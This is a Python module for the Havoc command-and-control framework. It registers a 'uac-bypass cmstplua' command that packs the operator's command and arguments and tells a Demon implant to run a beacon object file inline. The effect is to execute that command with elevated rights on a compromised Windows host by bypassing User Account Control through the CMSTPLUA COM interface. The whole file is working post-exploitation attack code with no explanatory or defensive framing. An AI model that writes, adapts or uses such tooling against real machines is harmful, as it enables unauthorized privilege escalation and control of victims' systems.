from havoc import Demon, RegisterCommand, RegisterModule
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer = b''
        self.size   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s)+1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

def run_uac_bypass_cmstplua(demonID, *params):
    demon  = Demon(demonID)
    packer = Packer()

    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please specify a command to execute")
        return False

    barch = demon.ProcessArch  # x86 or x64
    file_path = f"UACBypassCMSTPLUA.{barch}.o"

    try:
        with open(file_path, "rb") as f:
            object_bytes = f.read()
    except FileNotFoundError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Object file not found: {file_path}")
        return False

    # Substring logic for parameters
    full_input = " ".join(params)
    first_arg_len = len(params[0])
    if len(full_input) > first_arg_len + 1:
        parameters = full_input[first_arg_len + 1:]
    else:
        parameters = ""

    packer.addstr(params[0])   # Command to execute
    packer.addstr(parameters)  # Optional arguments

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked beacon to run UACBypassCMSTPLUA with {params[0]}")

    demon.InlineExecute(TaskID, "go", file_path, packer.getbuffer(), False)

    return TaskID

RegisterModule("uac-bypass", "Havoc UAC Bypass Module", "", "[subcommand] (args)", "", "")
RegisterCommand(
    run_uac_bypass_cmstplua,
    "uac-bypass",
    "cmstplua",
    "Execute the given command while bypassing UAC using CMSTPLUA.",
    0,
    "file_to_execute",
    "C:\\Users\\randy\\Desktop\\test.exe"
)
